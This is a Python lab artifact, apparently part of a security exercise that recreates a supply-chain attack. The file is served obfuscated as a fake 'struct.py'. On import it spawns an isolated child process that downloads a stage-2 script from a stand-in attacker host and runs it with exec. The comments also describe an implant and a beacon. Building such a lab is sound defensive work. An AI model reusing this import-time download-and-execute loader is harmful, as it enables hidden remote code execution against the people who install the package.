# shadow_payload.py  --  LAB ARTIFACT, BENIGN. Readable source, kept in the repo for
# transparency. The server base64+zlib-encodes THIS file into the `struct.py` it serves
# (mirroring the article's obfuscation), so a casual read of the served module does not
# reveal the behavior below. The behavior itself stays benign:
#
#   * print a marker line, then
#   * spawn an ISOLATED child (`python3 -I`) that pulls the local stage-2 from the
#     internal catalogue host. stage-2 drops a benign "implant" that writes a marker
#     file and sends ONE loopback beacon to the same internal host.
#
# No remote code, no real C2, nothing destructive. `-I` is used because the real attack
# used it (an isolated child ignores env, incl. proxy vars); the host is therefore
# hard-coded to the default below, since the child cannot read LAB_ATTACKER.
import os as _os
import subprocess as _subprocess

_ATTACKER = _os.environ.get("LAB_ATTACKER", "catalogue:8000")
print(f"[stage3] LAB-BENIGN struct shim executed at import (pid {_os.getpid()}, "
      f"cwd {_os.getcwd()})", flush=True)

_stage4 = (
    "import urllib.request;"
    f"exec(urllib.request.urlopen('http://{_ATTACKER}/stage2.py').read())"
)
try:
    _subprocess.Popen(["python3", "-I", "-c", _stage4])
except Exception as _e:  # never crash the host decoder
    print(f"[stage3] child spawn failed (lab): {_e}", flush=True)
